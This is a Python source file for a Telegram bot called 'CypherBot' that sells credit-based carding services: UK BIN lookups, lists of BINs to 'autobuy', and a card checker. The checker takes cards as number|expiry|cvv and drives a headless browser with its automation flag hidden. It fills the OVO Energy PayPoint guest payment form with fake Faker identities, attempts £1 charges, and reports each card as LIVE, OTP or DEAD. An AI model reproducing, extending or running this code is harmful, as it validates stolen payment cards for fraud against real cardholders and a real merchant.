from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, FSInputFile, InputFile, BufferedInputFile
from config import ADMIN_IDS
from io import BytesIO
from aiogram.fsm.context import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from states.bin_lookup import BinLookupState
from keyboards import main_menu, back_menu
from autobuy import run_autobuy
from aiogram.fsm.state import StatesGroup, State
from database import register_user, get_balance, set_balance, add_balance, get_all_users, set_api_token, get_api_token, set_bins_of_interest, get_bins_of_interest, add_bin_of_interest, remove_bin_of_interest, get_autobuy_bins, set_autobuy_bins, add_autobuy_bin, remove_autobuy_bin
from states.bin_lookup import OvoStates
from states.bin_lookup import BINInterestStates
from states.bin_lookup import AutobuyStates
from playwright.async_api import async_playwright
from database import set_ovo_id 
from database import get_ovo_id
from aiogram.filters import Command
from aiogram import types


from faker import Faker

faker = Faker("en_GB")

import uuid
import os
import io

router = Router()

class OVOStates(StatesGroup):
    waiting_for_ovo_id = State()

@router.message(F.text == "/start")
async def cmd_start(msg: Message):
    await register_user(msg.from_user.id, msg.from_user.username)
    balance = await get_balance(msg.from_user.id)
    user_name = msg.from_user.full_name or msg.from_user.username or "User"

    text = (
        f"💻 Welcome to CypherBot, {user_name}.\n\n"
        f"💰 You have {balance} credits remaining.\n\n"
        "Use the menu below to continue."
    )
    await msg.answer(text, parse_mode="Markdown", reply_markup=main_menu())


# =========================
# BIN Lookup Handlers
# =========================
import aiohttp
import aiofiles
import pandas as pd
from io import StringIO
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from database import register_user, get_balance, set_balance
from states import BinLookupState  # your FSM states module


CSV_URL = "https://raw.githubusercontent.com/venelinkochev/bin-list-data/refs/heads/master/bin-list-data.csv"  # Replace with your actual URL
binlookupbutton = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Go Back", callback_data="go_back_from_bin")]
])

mainmenubutton = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")]
])

@router.message(BinLookupState.waiting_for_bin)
async def bin_lookup(message: Message, state: FSMContext):
    user_id = message.from_user.id
    username = message.from_user.username or "NoName"

    # Register user if not exists
    user_balance = await get_balance(user_id)
    if user_balance is None:
        await register_user(user_id, username)
        user_balance = 0

    if user_balance < 0.1:
        await message.answer(
            "❌ Insufficient balance to perform BIN lookup.", reply_markup=mainmenubutton
        )
        await state.clear()
        return

    # Deduct £0.10 from balance
    new_balance = user_balance - 0.1
    if new_balance < 0:
        new_balance = 0
    await set_balance(user_id, new_balance)

    # Delete prompt message if exists
    data = await state.get_data()
    prompt_id = data.get("prompt_id")
    try:
        if prompt_id:
            await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_id)
        await message.delete()
    except Exception as e:
        print(f"⚠️ Failed to delete messages: {e}")

    user_input = message.text.strip().lower()

    try:
        # Fetch CSV data
        async with aiohttp.ClientSession() as session:
            async with session.get(CSV_URL) as resp:
                if resp.status != 200:
                    await message.answer("⚠️ Couldn't fetch BIN database.")
                    await state.clear()
                    return
                csv_data = await resp.text()

        # Load CSV
        df = pd.read_csv(StringIO(csv_data))

        # Filter UK BINs >= 400000
        df = df[
            (df['CountryName'].astype(str).str.lower() == "united kingdom") &
            (df['BIN'].astype(str).str.isdigit()) &
            (df['BIN'].astype(int) >= 400000)
        ]

        if user_input.isdigit():
            if len(user_input) == 6:
                rows = df[df['BIN'].astype(str) == user_input]

                if rows.empty:
                    await message.answer("❌ No matching UK BINs found.", reply_markup=mainmenubutton)
                    await state.clear()
                    return

                r = rows.iloc[0]
                response = (
                    f"✅ BIN Info:\n"
                    f"🔢 BIN: {r['BIN']}\n"
                    f"💳 Brand: {r.get('Brand', 'N/A')}\n"
                    f"🏦 Bank: {r.get('Issuer', 'N/A')}\n"
                    f"🌍 Country: {r.get('CountryName', 'N/A')}\n"
                    f"💻 Type: {r.get('Type', 'N/A')}\n"
                    f"📂 Category: {r.get('Category', 'N/A')}"
                )
                await message.answer(response, reply_markup=mainmenubutton)
                await state.clear()
                return


            else:
                await message.answer("❌ Enter a valid 6-digit BIN.", reply_markup=mainmenubutton)
                await state.clear()
                return

        else:
            # Search by keyword in issuer/brand/type
            rows = df[
                df['Issuer'].astype(str).str.lower().str.contains(user_input) |
                df['Brand'].astype(str).str.lower().str.contains(user_input) |
                df['Type'].astype(str).str.lower().str.contains(user_input)
            ]

            if rows.empty:
                await message.answer("❌ No matching UK BINs found.", reply_markup=mainmenubutton)
                await state.clear()
                return

            credit_rows = rows[rows['Type'].astype(str).str.lower().str.contains("credit")]
            debit_rows = rows[rows['Type'].astype(str).str.lower().str.contains("debit")]

            output_lines = []

            if not credit_rows.empty:
                output_lines.append("=== 💳 CREDIT CARDS ===")
                for _, r in credit_rows.iterrows():
                    output_lines.append(
                        f"{r['BIN']}, {r['Issuer']}, {r['Type']}, {r['Brand']}, {r.get('Category', 'N/A')}"
                    )

            if not debit_rows.empty:
                output_lines.append("\n=== 🏦 DEBIT CARDS ===")
                for _, r in debit_rows.iterrows():
                    output_lines.append(
                        f"{r['BIN']}, {r['Issuer']}, {r['Type']}, {r['Brand']}, {r.get('Category', 'N/A')}"
                    )

            if not output_lines:
                await message.answer("❌ No matching UK BINs found.", reply_markup=mainmenubutton)
                await state.clear()
                return

            filepath = "/tmp/uk_bin_results.txt"
            async with aiofiles.open(filepath, "w", encoding="utf-8") as f:
                await f.write("\n".join(output_lines))

            msg = await message.answer_document(
                FSInputFile(filepath),
                caption=f"📄 UK BINs matching: '{user_input}'", reply_markup=mainmenubutton
            )
            await state.update_data(result_msg_id=msg.message_id)

    except Exception as e:
        await message.answer(f"⚠️ Error: {e}")
        print(f"BIN lookup error: {e}")

    await state.clear()
    
@router.callback_query(F.data == "back_to_main")
async def handle_back_to_main(callback: CallbackQuery):
    user_id = callback.from_user.id
    user_name = callback.from_user.first_name
    balance = await get_balance(user_id)  # Replace with your actual balance fetch

    text = (
        f"💻 Welcome to CypherBot, {user_name}.\n\n"
        f"💰 You have {balance} credits remaining.\n\n"
        "Use the menu below to continue."
    )

    await callback.message.edit_text(text, reply_markup=main_menu())


@router.callback_query(F.data == "settings")
async def settings_placeholder(callback: CallbackQuery, state: FSMContext):
    await state.clear()  # ✅ Clear any active FSM state
    await callback.answer()  # Remove loading spinner
    await callback.message.edit_text(
        "⚙️ Settings: Coming soon...",
        reply_markup=mainmenubutton
    )

@router.callback_query(F.data == "secret")
async def handle_secret(callback: CallbackQuery):
    user_id = callback.from_user.id

    if user_id not in ADMIN_IDS:
        return await callback.answer("🚫 You’re not authorised to access this.", show_alert=True)

    secret_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔑 API Token", callback_data="api_token")],
        [InlineKeyboardButton(text="💳 Cards of Interest", callback_data="bins_of_interest")],
        [InlineKeyboardButton(text="🛒 Cards to Autobuy", callback_data="autobuy_bins")],
        InlineKeyboardButton(text="🚀 Run Autobuy Now", callback_data="run_autobuy"),
        [InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_to_main")]

    ])

    await callback.message.edit_text("🔐 *Secret Menu:*", reply_markup=secret_kb, parse_mode="Markdown")

@router.callback_query(F.data == "run_autobuy")
async def handle_run_autobuy(callback: CallbackQuery):
    user_id = callback.from_user.id
    await callback.message.edit_text("⏳ Running autobuy...")

    result_message = await run_autobuy(user_id)

    filepath = f"purchases/user_{user_id}.txt"
    if os.path.exists(filepath):
        await callback.message.answer_document(FSInputFile(filepath), caption=result_message)
    else:
        await callback.message.answer(result_message)
    
@router.callback_query(F.data == "bins_of_interest")
async def show_bins_of_interest(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    bins = await get_bins_of_interest(user_id)

    # Sort numerically if bins exist
    sorted_bins = sorted(bins, key=lambda x: int(x)) if bins else []
    bin_text = "\n".join(sorted_bins) if sorted_bins else "No BINs of interest yet."

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add BIN", callback_data="add_bin_of_interest")],
        [InlineKeyboardButton(text="➖ Remove BIN", callback_data="remove_bin_of_interest")],
        [InlineKeyboardButton(text="⬅️ Back", callback_data="back_to_main")]
    ])

    await callback.message.edit_text(f"📊 Your BINs of interest:\n\n{bin_text}", reply_markup=keyboard)

    await callback.message.edit_text(
        f"💳 Your BINs of Interest:\n\n{bin_text}",
        reply_markup=keyboard
    )

@router.callback_query(F.data == "add_bin_of_interest")
async def ask_bin_to_add(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("✏️ Send the 6-digit BIN you want to add:")
    await state.set_state(BINInterestStates.waiting_for_bin_add)

@router.callback_query(F.data == "remove_bin_of_interest")
async def ask_bin_to_remove(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("✏️ Send the 6-digit BIN you want to remove:")
    await state.set_state(BINInterestStates.waiting_for_bin_remove)

@router.message(BINInterestStates.waiting_for_bin_add)
async def process_add_bin(msg: Message, state: FSMContext):
    bin_code = msg.text.strip()
    if not bin_code.isdigit() or len(bin_code) != 6:
        return await msg.reply("❌ Please send a valid 6-digit BIN.")
    
    await add_bin_of_interest(msg.from_user.id, bin_code)
    await state.clear()

    # Inline buttons for follow-up actions
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add Another BIN", callback_data="add_bin_of_interest")],
        [InlineKeyboardButton(text="⬅️ Back to Main Menu", callback_data="back_to_main")]
    ])

    await msg.answer(f"✅ BIN `{bin_code}` has been added.", parse_mode="Markdown", reply_markup=keyboard)


@router.message(BINInterestStates.waiting_for_bin_remove)
async def process_remove_bin(msg: Message, state: FSMContext):
    bin_code = msg.text.strip()
    if not bin_code.isdigit() or len(bin_code) != 6:
        return await msg.reply("❌ Please send a valid 6-digit BIN.")

    await remove_bin_of_interest(msg.from_user.id, bin_code)
    await state.clear()

    # Inline buttons for follow-up actions
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➖ Remove Another BIN", callback_data="remove_bin_of_interest")],
        [InlineKeyboardButton(text="⬅️ Back to Main Menu", callback_data="back_to_main")]
    ])

    await msg.answer(f"✅ BIN `{bin_code}` has been removed.", parse_mode="Markdown", reply_markup=keyboard)


class APITokenStates(StatesGroup):
    waiting_for_api_token = State()

@router.callback_query(F.data == "api_token")
async def start_api_token_process(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if user_id not in ADMIN_IDS:
        return await callback.answer("🚫 You’re not authorised.", show_alert=True)
    await state.set_state(APITokenStates.waiting_for_api_token)
    await callback.message.edit_text("🔑 Please send me your API token.")

@router.message(APITokenStates.waiting_for_api_token)
async def process_api_token(message: Message, state: FSMContext):
    api_token = message.text.strip()
    user_id = message.from_user.id

    # Optionally validate api_token here (length, format, etc.)

    await set_api_token(user_id, api_token)
    await message.answer(f"✅ Your API token has been saved:\n`{api_token}`", parse_mode="Markdown")
    await state.clear()

@router.callback_query(F.data == "cards_autobuy")
async def handle_cards_autobuy(callback: CallbackQuery):
    await callback.message.edit_text("🛒 Cards to Autobuy (coming soon)", reply_markup=mainmenubutton)


@router.callback_query(F.data == "ccformatter")
async def ccformatter_placeholder(callback: CallbackQuery, state: FSMContext):
    await state.clear()  # ✅ Clear any FSM state
    await callback.answer()  # Remove Telegram's loading spinner
    await callback.message.edit_text(
        "🧾 CC Formatter: Coming soon...",
        reply_markup=mainmenubutton
    )

@router.callback_query(F.data == "autobuy_bins")
async def show_autobuy_bins(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    bins = await get_autobuy_bins(user_id)
    bin_text = "\n".join(bins) if bins else "No autobuy BINs yet."

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add BIN", callback_data="add_autobuy_bin")],
        [InlineKeyboardButton(text="➖ Remove BIN", callback_data="remove_autobuy_bin")],
        [InlineKeyboardButton(text="⬅️ Back", callback_data="back_to_main")]
    ])
    await callback.message.edit_text(f"📦 Autobuy BINs:\n\n{bin_text}", reply_markup=keyboard)

@router.callback_query(F.data == "add_autobuy_bin")
async def start_add_autobuy_bin(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🔢 Send the 6-digit BIN you want to autobuy:")
    await state.set_state(AutobuyStates.waiting_for_autobuy_bin_add)

@router.message(AutobuyStates.waiting_for_autobuy_bin_add)
async def process_add_autobuy_bin(msg: Message, state: FSMContext):
    bin_code = msg.text.strip()
    if not bin_code.isdigit() or len(bin_code) != 6:
        return await msg.reply("❌ Please send a valid 6-digit BIN.")
    
    await add_autobuy_bin(msg.from_user.id, bin_code)

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add Another", callback_data="add_autobuy_bin")],
        [InlineKeyboardButton(text="⬅️ Back to Menu", callback_data="back_to_main")]
    ])

    await msg.reply(f"✅ BIN `{bin_code}` has been added to autobuy list.", parse_mode="Markdown", reply_markup=keyboard)
    await state.clear()

@router.callback_query(F.data == "remove_autobuy_bin")
async def start_remove_autobuy_bin(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("✏️ Send the BIN you want to remove from autobuy list:")
    await state.set_state(AutobuyStates.waiting_for_autobuy_bin_remove)

@router.message(AutobuyStates.waiting_for_autobuy_bin_remove)
async def process_remove_autobuy_bin(msg: Message, state: FSMContext):
    bin_code = msg.text.strip()
    if not bin_code.isdigit() or len(bin_code) != 6:
        return await msg.reply("❌ Please send a valid 6-digit BIN.")
    
    await remove_autobuy_bin(msg.from_user.id, bin_code)

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add BIN", callback_data="add_autobuy_bin")],
        [InlineKeyboardButton(text="⬅️ Back to Menu", callback_data="back_to_main")]
    ])

    await msg.reply(f"✅ BIN `{bin_code}` has been removed from autobuy list.", parse_mode="Markdown", reply_markup=keyboard)
    await state.clear()

@router.callback_query(F.data == "bincountchecker")
async def bincountchecker_placeholder(callback: CallbackQuery, state: FSMContext):
    await state.clear()  # ✅ Clear any FSM state
    await callback.answer()  # Remove Telegram's loading spinner
    await callback.message.edit_text(
        "🔢 BIN Count Checker: Coming soon...",
        reply_markup=mainmenubutton
    )

@router.callback_query(F.data == "rm_charger")
async def rm_charger_placeholder(callback: CallbackQuery, state: FSMContext):
    await state.clear()  # ✅ Clear any FSM state
    await callback.answer()  # Remove Telegram's loading spinner
    await callback.message.edit_text(
        "⚡RM Charger: Coming soon...",
        reply_markup=mainmenubutton
    )

@router.callback_query(F.data == "BINlookup")
async def start_bin_lookup(callback: CallbackQuery, state: FSMContext):
    # Delete the main menu message
    await callback.message.delete()

    # Send the BIN lookup prompt message with "Back to main menu" button
    prompt = await callback.message.answer(
        "🔍 Enter a BIN (6 digits) or a keyword (e.g. bank name, 'credit', 'debit'):",
        reply_markup=mainmenubutton
    )
    
    await state.update_data(prompt_id=prompt.message_id)
    await state.set_state(BinLookupState.waiting_for_bin)
    await callback.answer()




# ===== Button click triggers FSM =====
@router.callback_query(F.data == "ovo_charger")
async def royalmail_callback(callback: CallbackQuery, state: FSMContext):
    await callback.message.delete()  # Delete the main menu message first
    await state.set_state(OvoStates.awaiting_cards)
    await callback.message.answer(
        "💳 Send the card(s) you'd like to check, one per line.\n"
        "🤝 Each check will cost 1 credit.\n\n"
        "Format: cardnumber|expmonth|expyear|cvv",
        reply_markup=mainmenubutton
    )
    await callback.answer()
    


@router.message(OvoStates.awaiting_cards)
async def handle_card_list(message: Message, state: FSMContext):
    user_id = message.from_user.id
    username = message.from_user.username or "NoName"

    cards = [line.strip() for line in message.text.splitlines() if line.strip()]
    if not cards:
        await message.answer("❌ No cards found. Try again.")
        return

    # Register user if not exists
    user_balance = await get_balance(user_id)
    if user_balance is None:
        await register_user(user_id, username)
        user_balance = 0

    # Check if user has enough credits for all cards
    if user_balance < len(cards):
        await message.answer(f"❌ Insufficient balance. You need {len(cards)} credit(s) but have {user_balance} credits.", reply_markup=mainmenubutton)
        await state.clear()
        return

    ovo_id = await get_ovo_id(message.from_user.id)

    await message.answer(
        f"🔍 Received {len(cards)} card(s).\n"
        f"⏳ Using your saved OVO ID: {ovo_id}\n"
        f"💸 Deducting {len(cards)} credit(s) from your balance."
    )

    live_cards = []  # to collect live cards

    for idx, card in enumerate(cards, start=1):
        # Deduct 1 credit per card
        user_balance -= 1
        if user_balance < 0:
            user_balance = 0
        await set_balance(user_id, user_balance)

        await message.answer(f"📦 Processing card {idx}: `{card}`", parse_mode="Markdown")
        screenshot_path, status = await take_royalmail_screenshot(message.from_user.id, card)

        if screenshot_path:
            await message.answer_photo(FSInputFile(screenshot_path), caption=f"Status: {status}")
            os.remove(screenshot_path)
        else:
            await message.answer(f"❌ Failed to process card `{card}`. Status: {status}")

        if status == "LIVE":
            live_cards.append(card)

    if live_cards:
        live_list_text = "\n".join(live_cards)
        await message.answer(f"✅ All done.\n\n🎉 Live cards:\n{live_list_text}", reply_markup=mainmenubutton)
    else:
        await message.answer("✅ All done.\n\nNo live cards found.", reply_markup=mainmenubutton)

    await state.clear()
async def take_royalmail_screenshot(user_id: int, card: str) -> tuple:
    filename = f"screenshots/{uuid.uuid4()}.png"
    os.makedirs("screenshots", exist_ok=True)

    try:
        card_parts = card.strip().split("|")
        if len(card_parts) != 4:
            print(f"[Invalid card format]: {card}")
            return None, "INVALID"

        card_number, exp_month, exp_year, cvv = card_parts
        if len(exp_year) == 2:
            exp_year = "20" + exp_year

        async with async_playwright() as p:
            user_data_dir = "/tmp/playwright-profile"
            browser = await p.chromium.launch_persistent_context(
                user_data_dir=user_data_dir,
                headless=True,
                args=["--no-sandbox"]
            )
            page = await browser.new_page()

            await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            await page.goto("https://ovoenergypayments.paypoint.com/GuestPayment", timeout=60000)

            # Fake details
            name = faker.name()
            address1 = faker.street_address()
            city = faker.city()
            postcode = faker.postcode()

            ovo_id = await get_ovo_id(user_id)
            if not ovo_id:
                return None, "NO_OVO_ID"

            await page.fill('#customerid', ovo_id)
            await page.fill('#amount', '1')
            await page.fill('#cardholdername', name)

            frame_element = await page.wait_for_selector('iframe[src*="hostedfields.paypoint.services"]', timeout=10000)
            frame = await frame_element.content_frame()
            await frame.fill('input[name="card_number"]', card_number)

            await page.select_option('select[name="PaymentCard.ExpiryMonth"]', exp_month)
            await page.select_option('select[name="PaymentCard.ExpiryYear"]', exp_year)
            await page.fill('input[name="PaymentCard.CVV"]', cvv)

            await page.fill('#postcode', postcode)
            await page.fill('#address1', address1)
            await page.fill('#city', city)
            await page.fill('#emailForConfirmation', 'maxxxier@yahoo.com')
            await page.fill('#mobileNumberForSmsConfirmation', '07454805800')
            await page.check('input[name="AcceptedTermsAndConditions"]')

            
            # Click the Make Payment button
            button_locator = page.locator('input#makePayment')
            # Try clicking once
            await button_locator.click(force=True, timeout=10000)
            await page.wait_for_timeout(2000)  # brief pause after click
            # Check if button still visible — retry if needed
            for attempt in range(2):  # retry up to 2 times
                if await button_locator.is_visible():
                    print(f"[Retry] Button still visible. Retrying click... (Attempt {attempt + 1})")
                    await button_locator.click(force=True)
                    await page.wait_for_timeout(2000)
                else:
                    break
            else:
                print("[Warning] Button still visible after 2 retries.")

            await page.wait_for_timeout(15000)  # brief pause after click
            
            status = "UNKNOWN"
            for frame in page.frames:
                try:
                    content = await frame.content()
                    text = content.lower()
                    if "payment authorised" in text:
                        status = "LIVE"
                        break
                    elif any(w in text for w in ["verify", "otp", "authorise", "mobile app"]):
                        status = "OTP"
                        break
                    elif "declined" in text:
                        status = "DEAD"
                        break
                except Exception:
                    continue

            await page.screenshot(path=filename, full_page=True)
            await browser.close()
            return filename, status

    except Exception as e:
        print(f"[Screenshot Error for card {card}]: {e}")
        return None, "ERROR"

@router.message(Command("setovo"))
async def cmd_set_ovo(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("📖Send me your OVO Customer ID... ", reply_markup=mainmenubutton)
    await state.set_state(OVOStates.waiting_for_ovo_id)

@router.message(OVOStates.waiting_for_ovo_id)
async def process_ovo_id(message: types.Message, state: FSMContext):
    ovo_id = message.text.strip()

    # Optionally validate ovo_id here (for example, length check)
    if not ovo_id.isdigit() or len(ovo_id) < 10:
        await message.answer("❌ Invalid OVO Customer ID. Send a valid number.")
        return

    await set_ovo_id(message.from_user.id, ovo_id)
    await message.answer(f"✅ Your OVO Customer ID has been saved:\n`{ovo_id}`", parse_mode="Markdown")
    await state.clear()
    
@router.callback_query(F.data == "back_main")
async def back_main(cb: CallbackQuery, state: FSMContext):
    await state.clear()  # Clear FSM state

    balance = await get_balance(cb.from_user.id)
    user_name = cb.from_user.full_name or cb.from_user.username or "User"  # ✅ use cb instead of msg

    text = (
        f"💻 Welcome to CypherBot, {user_name}.\n\n"
        f"💰 You have {balance} credits remaining.\n\n"
        "Use the menu below to continue."
    )

    await cb.message.edit_text(text, reply_markup=main_menu())
    await cb.answer()



@router.message(F.text.startswith("/setbalance"))
async def set_balance_cmd(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return await msg.reply("🚫 You’re not authorised to use this command.", reply_markup=mainmenubutton)
    try:
        _, uid, amount = msg.text.split()
        await set_balance(int(uid), int(amount))
        await msg.reply("✅ Balance set.")
    except:
        await msg.reply("❌ Usage: /setbalance <id> <amount>")

@router.message(F.text.startswith("/addbalance"))
async def add_balance_cmd(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return await msg.reply("🚫 You’re not authorised to use this command.", reply_markup=mainmenubutton)
    try:
        _, uid, amount = msg.text.split()
        await add_balance(int(uid), int(amount))
        await msg.reply("✅ Balance added.")
    except:
        await msg.reply("❌ Usage: /addbalance <id> <amount>")

@router.message(F.text == "/viewusers")
async def view_users(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return await msg.reply("🚫 You’re not authorised to use this command.", reply_markup=mainmenubutton)

    users = await get_all_users()
    lines = [
        f"{u['id']} | @{u['username'] or '—'} | £{u['balance']} | {u.get('api_token') or 'N/A'} | {u.get('bins_of_interest') or '—'}"
        for u in users
    ]
    text = "ID | Username | Balance | API Token | BINS of interest\n" + "\n".join(lines) if lines else "No users yet."

    buffer = io.BytesIO(text.encode("utf-8"))
    file = BufferedInputFile(buffer.getvalue(), filename="users.txt")

    await msg.answer_document(file, caption="📄 All registered users", reply_markup=mainmenubutton)
